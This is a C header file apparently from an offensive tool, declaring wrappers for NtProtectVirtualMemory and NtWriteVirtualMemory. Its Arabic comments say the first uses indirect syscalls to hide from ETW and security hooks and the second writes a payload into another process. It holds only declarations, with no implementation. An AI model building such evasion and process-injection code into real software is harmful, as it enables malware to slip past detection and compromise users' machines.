#ifndef S4M1A_SYSCALLS_H
#define S4M1A_SYSCALLS_H

#include <windows.h>

/** NtProtectVirtualMemory عبر syscall غير مباشر (إخفاء عن ETW/hooks). */
NTSTATUS s4m1a_ntprotect(HANDLE hProc, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt);
/** NtWriteVirtualMemory — كتابة payload في العملية. */
NTSTATUS s4m1a_ntwrite(HANDLE hProc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T written);

#endif